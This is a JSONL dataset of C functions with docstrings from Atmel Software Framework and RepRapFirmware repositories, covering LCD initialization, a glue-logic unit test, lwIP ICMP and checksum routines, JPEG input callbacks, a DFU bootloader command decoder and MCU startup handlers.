{"docstring": "/**\n * \\brief Initialize the LCD controller\n *\n * Call this function to initialize the hardware interface and the LCD\n * controller. When initialization is done the display is turned on and ready\n * to receive data.\n */\n", "func_signal": "void st7565r_init(void)", "code": "{\n\t// Do a hard reset of the LCD display controller\n\tst7565r_hard_reset();\n\n\t// Initialize the interface\n\tst7565r_interface_init();\n\n\t// Set the A0 pin to the default state (command)\n\tioport_set_pin_low(ST7565R_A0_PIN);\n\n\t// The column address is set to increasing\n\tst7565r_write_command(ST7565R_CMD_ADC_NORMAL);\n\n\t// Non-inverted display\n\tst7565r_display_invert_disable();\n\n\t// The common mode scan direction is reversed COM31->COM0\n\tst7565r_write_command(ST7565R_CMD_REVERSE_SCAN_DIRECTION);\n\n\t// Set the voltage bias ratio to 1/6\n\tst7565r_write_command(ST7565R_CMD_LCD_BIAS_1_DIV_6_DUTY33);\n\n\t// Set booster circuit, voltage regulator and voltage follower all to on\n\tst7565r_write_command(ST7565R_CMD_POWER_CTRL_ALL_ON);\n\n\t// Set the booster ratio to 2X,3X,4X\n\tst7565r_write_command(ST7565R_CMD_BOOSTER_RATIO_SET);\n\tst7565r_write_command(ST7565R_CMD_BOOSTER_RATIO_2X_3X_4X);\n\n\t// Set voltage resistor ratio to 1\n\tst7565r_write_command(ST7565R_CMD_VOLTAGE_RESISTOR_RATIO_1);\n\n\t/* Set contrast to min value, no need to check return value as the contrast\n\tis set to the defined min*/\n\tst7565r_set_contrast(ST7565R_DISPLAY_CONTRAST_MIN);\n\n\t// Turn on the display\n\tst7565r_display_on();\n}", "path": "common\\components\\display\\st7565r\\st7565r.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/**\n * \\brief Test GLOC Logic module with 4 Inputs XOR.\n *\n * This tests check the capabilty of the Glue Logic driver to handle 4\n * inputs XOR operation.\n *\n * \\param test Current test case.\n */\n", "func_signal": "static void run_gloc_4inputs_xor_test(const struct test_case *test)", "code": "{\n\tbool out;\n\n\t/* Configure pins for changing GLOC input */\n\tioport_set_pin_dir(CONF_TEST_GLOC_IN0, IOPORT_DIR_OUTPUT);\n\tioport_set_pin_dir(CONF_TEST_GLOC_IN1, IOPORT_DIR_OUTPUT);\n\tioport_set_pin_dir(CONF_TEST_GLOC_IN2, IOPORT_DIR_OUTPUT);\n\tioport_set_pin_dir(CONF_TEST_GLOC_IN3, IOPORT_DIR_OUTPUT);\n\n\t/* Set the 4 inputs XOR truth table value in LUT0. */\n\tgloc_lut_get_config_defaults(&lut_config);\n\tlut_config.truth_table_value = XOR_TRUTH_TABLE_FOUR_INPUT;\n\tgloc_lut_set_config(&dev_inst, 0, &lut_config);\n\n\t/* Test GLOC with different input */\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, LOW);\n\t/** Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == false, \"4 inputs XOR failed at 1\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, LOW);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == true, \"4 inputs XOR failed at 2\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, LOW);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == true, \"4 inputs XOR failed at 3\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, LOW);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == false, \"4 inputs XOR failed at 4\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, LOW);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == true, \"4 inputs XOR failed at 5\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, LOW);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == false, \"4 inputs XOR failed at 6\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, LOW);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == false, \"4 inputs XOR failed at 7\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, LOW);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == true, \"4 inputs XOR failed at 8\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, HIGH);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == true, \"4 inputs XOR failed at 9\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, HIGH);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == false, \"4 inputs XOR failed at 10\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, HIGH);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == false, \"4 inputs XOR failed at 11\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, HIGH);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == true, \"4 inputs XOR failed at 12\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, HIGH);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == false, \"4 inputs XOR failed at 13\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, HIGH);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == true, \"4 inputs XOR failed at 14\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, LOW);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, HIGH);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == true, \"4 inputs XOR failed at 15\");\n\n\tioport_set_pin_level(CONF_TEST_GLOC_IN0, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN1, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN2, HIGH);\n\tioport_set_pin_level(CONF_TEST_GLOC_IN3, HIGH);\n\t/* Ensure a minimum propagation delay to read the port pin. */\n\tdelay_us(50);\n\tout = ioport_get_pin_level(CONF_TEST_GLOC_OUT0);\n\ttest_assert_true(test, out == false, \"4 inputs XOR failed at 16\");\n}", "path": "sam\\drivers\\gloc\\unit_tests\\unit_tests.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/**\n * Processes ICMP input packets, called from ip_input().\n *\n * Currently only processes icmp echo requests and sends\n * out the echo response.\n *\n * @param p the icmp echo request packet, p->payload pointing to the ip header\n * @param inp the netif on which this packet was received\n */\n", "func_signal": "void\nicmp_input(struct pbuf *p, struct netif *inp)", "code": "{\n  u8_t type;\n#ifdef LWIP_DEBUG\n  u8_t code;\n#endif /* LWIP_DEBUG */\n  struct icmp_echo_hdr *iecho;\n  struct ip_hdr *iphdr;\n  struct ip_addr tmpaddr;\n  s16_t hlen;\n\n  ICMP_STATS_INC(icmp.recv);\n  snmp_inc_icmpinmsgs();\n\n\n  iphdr = p->payload;\n  hlen = IPH_HL(iphdr) * 4;\n  if (pbuf_header(p, -hlen) || (p->tot_len < sizeof(u16_t)*2)) {\n    LWIP_DEBUGF(ICMP_DEBUG, (\"icmp_input: short ICMP (%\"U16_F\" bytes) received\\n\", p->tot_len));\n    goto lenerr;\n  }\n\n  type = *((u8_t *)p->payload);\n#ifdef LWIP_DEBUG\n  code = *(((u8_t *)p->payload)+1);\n#endif /* LWIP_DEBUG */\n  switch (type) {\n  case ICMP_ECHO:\n#if !LWIP_MULTICAST_PING || !LWIP_BROADCAST_PING\n    {\n      int accepted = 1;\n#if !LWIP_MULTICAST_PING\n      /* multicast destination address? */\n      if (ip_addr_ismulticast(&iphdr->dest)) {\n        accepted = 0;\n      }\n#endif /* LWIP_MULTICAST_PING */\n#if !LWIP_BROADCAST_PING\n      /* broadcast destination address? */\n      if (ip_addr_isbroadcast(&iphdr->dest, inp)) {\n        accepted = 0;\n      }\n#endif /* LWIP_BROADCAST_PING */\n      /* broadcast or multicast destination address not acceptd? */\n      if (!accepted) {\n        LWIP_DEBUGF(ICMP_DEBUG, (\"icmp_input: Not echoing to multicast or broadcast pings\\n\"));\n        ICMP_STATS_INC(icmp.err);\n        pbuf_free(p);\n        return;\n      }\n    }\n#endif /* !LWIP_MULTICAST_PING || !LWIP_BROADCAST_PING */\n    LWIP_DEBUGF(ICMP_DEBUG, (\"icmp_input: ping\\n\"));\n    if (p->tot_len < sizeof(struct icmp_echo_hdr)) {\n      LWIP_DEBUGF(ICMP_DEBUG, (\"icmp_input: bad ICMP echo received\\n\"));\n      goto lenerr;\n    }\n    if (inet_chksum_pbuf(p) != 0) {\n      LWIP_DEBUGF(ICMP_DEBUG, (\"icmp_input: checksum failed for received ICMP echo\\n\"));\n      pbuf_free(p);\n      ICMP_STATS_INC(icmp.chkerr);\n      snmp_inc_icmpinerrors();\n      return;\n    }\n#if LWIP_ICMP_ECHO_CHECK_INPUT_PBUF_LEN\n    if (pbuf_header(p, (PBUF_IP_HLEN + PBUF_LINK_HLEN))) {\n      /* p is not big enough to contain link headers\n       * allocate a new one and copy p into it\n       */\n      struct pbuf *r;\n      /* switch p->payload to ip header */\n      if (pbuf_header(p, hlen)) {\n        LWIP_ASSERT(\"icmp_input: moving p->payload to ip header failed\\n\", 0);\n        goto memerr;\n      }\n      /* allocate new packet buffer with space for link headers */\n      r = pbuf_alloc(PBUF_LINK, p->tot_len, PBUF_RAM);\n      if (r == NULL) {\n        LWIP_DEBUGF(ICMP_DEBUG, (\"icmp_input: allocating new pbuf failed\\n\"));\n        goto memerr;\n      }\n      LWIP_ASSERT(\"check that first pbuf can hold struct the ICMP header\",\n                  (r->len >= hlen + sizeof(struct icmp_echo_hdr)));\n      /* copy the whole packet including ip header */\n      if (pbuf_copy(r, p) != ERR_OK) {\n        LWIP_ASSERT(\"icmp_input: copying to new pbuf failed\\n\", 0);\n        goto memerr;\n      }\n      iphdr = r->payload;\n      /* switch r->payload back to icmp header */\n      if (pbuf_header(r, -hlen)) {\n        LWIP_ASSERT(\"icmp_input: restoring original p->payload failed\\n\", 0);\n        goto memerr;\n      }\n      /* free the original p */\n      pbuf_free(p);\n      /* we now have an identical copy of p that has room for link headers */\n      p = r;\n    } else {\n      /* restore p->payload to point to icmp header */\n      if (pbuf_header(p, -(s16_t)(PBUF_IP_HLEN + PBUF_LINK_HLEN))) {\n        LWIP_ASSERT(\"icmp_input: restoring original p->payload failed\\n\", 0);\n        goto memerr;\n      }\n    }\n#endif /* LWIP_ICMP_ECHO_CHECK_INPUT_PBUF_LEN */\n    /* At this point, all checks are OK. */\n    /* We generate an answer by switching the dest and src ip addresses,\n     * setting the icmp type to ECHO_RESPONSE and updating the checksum. */\n    iecho = p->payload;\n    tmpaddr.addr = iphdr->src.addr;\n    iphdr->src.addr = iphdr->dest.addr;\n    iphdr->dest.addr = tmpaddr.addr;\n    ICMPH_TYPE_SET(iecho, ICMP_ER);\n    /* adjust the checksum */\n    if (iecho->chksum >= htons(0xffff - (ICMP_ECHO << 8))) {\n      iecho->chksum += htons(ICMP_ECHO << 8) + 1;\n    } else {\n      iecho->chksum += htons(ICMP_ECHO << 8);\n    }\n\n    /* Set the correct TTL and recalculate the header checksum. */\n    IPH_TTL_SET(iphdr, ICMP_TTL);\n    IPH_CHKSUM_SET(iphdr, 0);\n#if CHECKSUM_GEN_IP\n    IPH_CHKSUM_SET(iphdr, inet_chksum(iphdr, IP_HLEN));\n#endif /* CHECKSUM_GEN_IP */\n\n    ICMP_STATS_INC(icmp.xmit);\n    /* increase number of messages attempted to send */\n    snmp_inc_icmpoutmsgs();\n    /* increase number of echo replies attempted to send */\n    snmp_inc_icmpoutechoreps();\n\n    if(pbuf_header(p, hlen)) {\n      LWIP_ASSERT(\"Can't move over header in packet\", 0);\n    } else {\n      err_t ret;\n      ret = ip_output_if(p, &(iphdr->src), IP_HDRINCL,\n                   ICMP_TTL, 0, IP_PROTO_ICMP, inp);\n      if (ret != ERR_OK) {\n        LWIP_DEBUGF(ICMP_DEBUG, (\"icmp_input: ip_output_if returned an error: %c.\\n\", ret));\n      }\n    }\n    break;\n  default:\n    LWIP_DEBUGF(ICMP_DEBUG, (\"icmp_input: ICMP type %\"S16_F\" code %\"S16_F\" not supported.\\n\",\n                (s16_t)type, (s16_t)code));\n    ICMP_STATS_INC(icmp.proterr);\n    ICMP_STATS_INC(icmp.drop);\n  }\n  pbuf_free(p);\n  return;\nlenerr:\n  pbuf_free(p);\n  ICMP_STATS_INC(icmp.lenerr);\n  snmp_inc_icmpinerrors();\n  return;\n#if LWIP_ICMP_ECHO_CHECK_INPUT_PBUF_LEN\nmemerr:\n  pbuf_free(p);\n  ICMP_STATS_INC(icmp.err);\n  snmp_inc_icmpinerrors();\n  return;\n#endif /* LWIP_ICMP_ECHO_CHECK_INPUT_PBUF_LEN */\n}", "path": "thirdparty\\lwip\\lwip-1.3.2\\src\\core\\ipv4\\icmp.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static void\nprint_processes(struct process * const processes[])", "code": "{\n  printf(\"Starting\");\n  while(*processes != NULL) {\n    printf(\" %s\", (*processes)->name);\n    processes++;\n  }\n  putchar('\\n');\n}", "path": "thirdparty\\wireless\\SmartConnect_6LoWPAN\\examples\\udp-unicast-sender\\udp-unicast-sender-main.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/* JPEG library callback to initialize this module.\n */\n", "func_signal": "void jpeg_stdio_src (j_decompress_ptr cinfo, FILE * infile)", "code": "{\n  my_src_ptr src;\n\n  /* The source object and input buffer are made permanent so that a series\n   * of JPEG images can be read from the same file by calling jpeg_stdio_src\n   * only before the first one.  (If we discarded the buffer at the end of\n   * one image, we'd likely lose the start of the next one.)\n   * This makes it unsafe to use this manager and a different source\n   * manager serially with the same JPEG object.  Caveat programmer.\n   */\n  if (cinfo->src == NULL) {     /* first time for this JPEG object? */\n    cinfo->src = (struct jpeg_source_mgr *)\n      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_PERMANENT,\n                                  SIZEOF(my_source_mgr));\n    src = (my_src_ptr) cinfo->src;\n    // allocate input buffer\n    src->buffer = (JOCTET *)\n      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_PERMANENT,\n                                  JPEG_INPUT_BUF_SIZE * SIZEOF(JOCTET));\n  }\n\n  src = (my_src_ptr) cinfo->src;\n  src->pub.init_source = init_source;\n  src->pub.fill_input_buffer = fill_input_buffer;\n  src->pub.skip_input_data = skip_input_data;\n  src->pub.resync_to_restart = jpeg_resync_to_restart; /* use default method */\n  src->pub.term_source = term_source;\n  src->infile = infile;\n  src->pub.bytes_in_buffer = 0; /* forces fill_input_buffer on first read */\n  src->pub.next_input_byte = NULL; /* until buffer loaded */\n}", "path": "avr32\\applications\\uc3-audio-player\\jpg\\jdatasrc.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/* Callback function of the JPEG library in order to fill the input buffer.\n */\n", "func_signal": "static boolean fill_input_buffer(j_decompress_ptr cinfo)", "code": "{\n\tmy_src_ptr src = (my_src_ptr) cinfo->src;\n\tsize_t nbytes;\n\n\tnbytes = file_read_buf(src->buffer, JPEG_INPUT_BUF_SIZE);\n\tif(nbytes <= 0)\n\t{\n\t\tif (src->start_of_file)\n\t\t{ /* Treat empty input file as fatal error */\n\t\t\treturn false;//ERREXIT(cinfo, JERR_INPUT_EMPTY);\n\t\t}\n\t\t//WARNMS(cinfo, JWRN_JPEG_EOF);\n\t\tsrc->buffer[0] = (JOCTET) 0xFF;\n\t\tsrc->buffer[1] = (JOCTET) JPEG_EOI;\n\t\tnbytes = 2;\n\t}\n\tsrc->pub.next_input_byte = src->buffer;\n\tsrc->pub.bytes_in_buffer = nbytes;\n\tsrc->start_of_file = false;\n\n\treturn true;\n}", "path": "avr32\\applications\\uc3-audio-player\\jpg\\jdatasrc.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "// V1\n", "func_signal": "static bool udi_dfu_flip_msg_decode(void)", "code": "{\n\t// By default no callback initialized\n\t// By default request states are success and finish\n\tudi_dfu_atmel_reset_protocol();\n\tudi_dfu_atmel_upload_callback = NULL;\n\n\t// Decode Atmel command ID\n\tswitch (CAT_CMD(udi_dfu_flip_msg.msg.cmd_id,\n\t\t\tudi_dfu_flip_msg.msg.arg[0])) {\n\n#ifndef ISP_SMALL_MEMORY_SIZE\n\t// Command to change high address\n\tcase CAT_CMD(FLIP_V1_CMD_CHANGE_BASE_ADDR,\n\t\t\t\t\t FLIP_V1_CMD_CHANGE_BASE_ADDR_ARG0):\n\t\treturn udi_dfu_flip_msg_decode_changeaddr();\n#endif\n\n\t// Commands to program a memory\n\tcase CAT_CMD(FLIP_V1_CMD_PROG_START,\n\t\t\tFLIP_V1_CMD_PROG_START_ARG_FLASH):\n\t\treturn udi_dfu_atmel_progstart(ISP_MEM_FLASH);\n\tcase CAT_CMD(FLIP_V1_CMD_PROG_START,\n\t\t\tFLIP_V1_CMD_PROG_START_ARG_EEPROM):\n\t\treturn udi_dfu_atmel_progstart(ISP_MEM_EEPROM);\n\tcase CAT_CMD(FLIP_V1_CMD_PROG_START,\n\t\t\tFLIP_V1_CMD_PROG_START_ARG_CUSTOM):\n\t\treturn udi_dfu_atmel_progstart(ISP_MEM_CUSTOM);\n\n\t// Commands to read a memory\n\tcase CAT_CMD(FLIP_V1_CMD_READ,\n\t\t\tFLIP_V1_CMD_READ_ARG_FLASH):\n\t\treturn udi_dfu_atmel_read(ISP_MEM_FLASH,false);\n\tcase CAT_CMD(FLIP_V1_CMD_READ,\n\t\t\tFLIP_V1_CMD_READ_ARG_EEPROM):\n\t\treturn udi_dfu_atmel_read(ISP_MEM_EEPROM,false);\n\tcase CAT_CMD(FLIP_V1_CMD_READ,\n\t\t\tFLIP_V1_CMD_READ_ARG_CUSTOM):\n\t\treturn udi_dfu_atmel_read(ISP_MEM_CUSTOM,false);\n\n\t// Commands to blank check a memory\n\tcase CAT_CMD(FLIP_V1_CMD_READ,\n\t\t\tFLIP_V1_CMD_READ_ARG_FLASHCHECK):\n\t\treturn udi_dfu_atmel_read(ISP_MEM_FLASH,true);\n\t}\n\n\tswitch (CAT_CMD(udi_dfu_flip_msg.msg.cmd_id,\n\t\t\tudi_dfu_flip_msg.msg.arg[0])) {\n\n\t// Commands to erase chip\n\tcase CAT_CMD(FLIP_V1_CMD_WRITE,\n\t\t\tFLIP_V1_CMD_WRITE_ARG_ERASE):\n\t\treturn udi_dfu_atmel_chip_erase();\n\n\t// Commands to start application\n\tcase CAT_CMD(FLIP_V1_CMD_WRITE,\n\t\t\tFLIP_V1_CMD_WRITE_ARG_RST):\n\t\tudi_dfu_atmel_start_app();\n\t\treturn true;\n\n\t// Commands to read Bootloader version\n\tcase CAT_CMD(FLIP_V1_CMD_READ_ID,\n\t\t\tFLIP_V1_CMD_READ_ID_ARG_BOOTLOADER):\n\t\tudi_dfu_atmel_read_id(ISP_MEM_BOOTLOADER,\n\t\t\tudi_dfu_flip_msg.msg.arg[1]);\n\t\treturn true;\n\n\t// Commands to read Chip identification\n\tcase CAT_CMD(FLIP_V1_CMD_READ_ID,\n\t\t\tFLIP_V1_CMD_READ_ID_ARG_SIGNATURE):\n\t\tswitch (udi_dfu_flip_msg.msg.arg[1]) {\n\t\tcase FLIP_V1_CMD_READ_ID_SIGNATURE_ARG_MANUF:\n\t\t\tudi_dfu_atmel_read_id(ISP_MEM_SIGNATURE,0);\n\t\t\tbreak;\n\t\tcase FLIP_V1_CMD_READ_ID_SIGNATURE_ARG_FAMILY:\n\t\t\tudi_dfu_atmel_read_id(ISP_MEM_SIGNATURE,1);\n\t\t\tbreak;\n\t\tcase FLIP_V1_CMD_READ_ID_SIGNATURE_ARG_PRODUCT:\n\t\t\tudi_dfu_atmel_read_id(ISP_MEM_SIGNATURE,2);\n\t\t\tbreak;\n\t\tcase FLIP_V1_CMD_READ_ID_SIGNATURE_ARG_REVISION:\n\t\t\tudi_dfu_atmel_read_id(ISP_MEM_SIGNATURE,3);\n\t\t\tbreak;\n\t\t}\n\t\treturn true;\n\t}\n\n\treturn false;  // Unknown command\n}", "path": "common\\services\\usb\\class\\dfu_flip\\device\\udi_dfu_atmel.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/**\n * \\brief Default interrupt handler for unused IRQs.\n */\n", "func_signal": "void Dummy_Handler(void)", "code": "{\n\twhile (1) {\n\t}\n}", "path": "Hardware\\duet\\sam\\system\\CMSIS\\Device\\ATMEL\\sam3sd8\\source\\gcc\\startup_sam3sd8.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/**\n * \\brief Default interrupt handler for unused IRQs.\n */\n", "func_signal": "void Dummy_Handler(void)", "code": "{\n\twhile (1) {\n\t}\n}", "path": "Hardware\\duet\\sam\\system\\CMSIS\\Device\\ATMEL\\sam3sd8\\source\\as_gcc\\startup_sam3sd8.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/* Version #1 */\n/**\n * lwip checksum\n *\n * @param dataptr points to start of data to be summed at any boundary\n * @param len length of data to be summed\n * @return host order (!) lwip checksum (non-inverted Internet sum) \n *\n * @note accumulator size limits summable length to 64k\n * @note host endianess is irrelevant (p3 RFC1071)\n */\n", "func_signal": "static u16_t\nlwip_standard_chksum(void *dataptr, u16_t len)", "code": "{\n  u32_t acc;\n  u16_t src;\n  u8_t *octetptr;\n\n  acc = 0;\n  /* dataptr may be at odd or even addresses */\n  octetptr = (u8_t*)dataptr;\n  while (len > 1) {\n    /* declare first octet as most significant\n       thus assume network order, ignoring host order */\n    src = (*octetptr) << 8;\n    octetptr++;\n    /* declare second octet as least significant */\n    src |= (*octetptr);\n    octetptr++;\n    acc += src;\n    len -= 2;\n  }\n  if (len > 0) {\n    /* accumulate remaining octet */\n    src = (*octetptr) << 8;\n    acc += src;\n  }\n  /* add deferred carry bits */\n  acc = (acc >> 16) + (acc & 0x0000ffffUL);\n  if ((acc & 0xffff0000UL) != 0) {\n    acc = (acc >> 16) + (acc & 0x0000ffffUL);\n  }\n  /* This maybe a little confusing: reorder sum using htons()\n     instead of ntohs() since it has a little less call overhead.\n     The caller must invert bits for Internet sum ! */\n  return htons((u16_t)acc);\n}", "path": "Libraries\\Lwip\\lwip\\src\\core\\ipv4\\inet_chksum.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/**\n * Call netif_add() in a thread-safe way by running that function inside the\n * tcpip_thread context.\n *\n * @note for params @see netif_add()\n */\n", "func_signal": "err_t\nnetifapi_netif_add(struct netif *netif,\n                   ip_addr_t *ipaddr,\n                   ip_addr_t *netmask,\n                   ip_addr_t *gw,\n                   void *state,\n                   netif_init_fn init,\n                   netif_input_fn input)", "code": "{\n  struct netifapi_msg msg;\n  msg.function = do_netifapi_netif_add;\n  msg.msg.netif = netif;\n  msg.msg.msg.add.ipaddr  = ipaddr;\n  msg.msg.msg.add.netmask = netmask;\n  msg.msg.msg.add.gw      = gw;\n  msg.msg.msg.add.state   = state;\n  msg.msg.msg.add.init    = init;\n  msg.msg.msg.add.input   = input;\n  TCPIP_NETIFAPI(&msg);\n  return msg.msg.err;\n}", "path": "Libraries\\Lwip\\lwip\\src\\api\\netifapi.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/**\n * \\brief This is the code that gets called on processor reset.\n * To initialize the device, and call the main() routine.\n */\n", "func_signal": "void Reset_Handler(void)", "code": "{\n\tuint32_t *pSrc, *pDest;\n\n\t/* Initialize the relocate segment */\n\tpSrc = &_etext;\n\tpDest = &_srelocate;\n\n\tif (pSrc != pDest) {\n\t\tfor (; pDest < &_erelocate;) {\n\t\t\t*pDest++ = *pSrc++;\n\t\t}\n\t}\n\n\t/* Clear the zero segment */\n\tfor (pDest = &_szero; pDest < &_ezero;) {\n\t\t*pDest++ = 0;\n\t}\n\n\t/* Set the vector table base address */\n\tpSrc = (uint32_t *) & _sfixed;\n\tSCB->VTOR = ((uint32_t) pSrc & SCB_VTOR_TBLOFF_Msk);\n\n\tif (((uint32_t) pSrc >= IRAM_ADDR) && ((uint32_t) pSrc < IRAM_ADDR + IRAM_SIZE)) {\n\t\tSCB->VTOR |= (1UL) << SCB_VTOR_TBLBASE_Pos;\n\t}\n\n\t/* Initialize the C library */\n\t__libc_init_array();\n\n\t/* Branch to main function */\n\tmain();\n\n\t/* Infinite loop */\n\twhile (1);\n}", "path": "Hardware\\duet\\sam\\system\\CMSIS\\Device\\ATMEL\\sam3sd8\\source\\gcc\\startup_sam3sd8.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
